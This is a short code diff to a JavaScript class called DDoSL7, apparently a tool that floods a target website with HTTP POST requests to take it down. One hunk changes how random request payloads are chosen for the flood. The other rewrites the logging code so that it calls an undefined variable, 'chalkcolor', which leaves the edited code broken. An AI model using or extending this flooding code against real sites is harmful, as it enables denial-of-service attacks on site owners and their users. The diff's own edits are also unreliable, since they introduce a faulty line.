@@ -326,7 +326,7 @@ class DDoSL7 {
 
     postFlood() {
         const headers = this.genHeaders('POST');
-        const body = this.payloads[crypto.randomInt(0, this.payloads.length)]();
+        const body = this.payloads[Math.floor(Math.random() * this.payloads.length)]();
         axios.post(this.target + '?' + this.puid(), body, {
             timeout: 2000,
             validateStatus: false,
@@ -580,8 +580,8 @@ class DDoSL7 {
         const timestamp = new Date().toLocaleTimeString();
         const formattedMsg = `[${timestamp}] ${msg}`;
         if (this.io) this.io.emit('log', { msg: formattedMsg, type });
-        const color = type === 'error' ? chalk.red : (type === 'success' ? chalk.green : chalk.yellow);
-        console.log(color(formattedMsg));
+        const color = type === 'error' ? 'red' : (type === 'success' ? 'green' : 'yellow');
+        console.log(chalkcolor);
     }
 
     stop() {
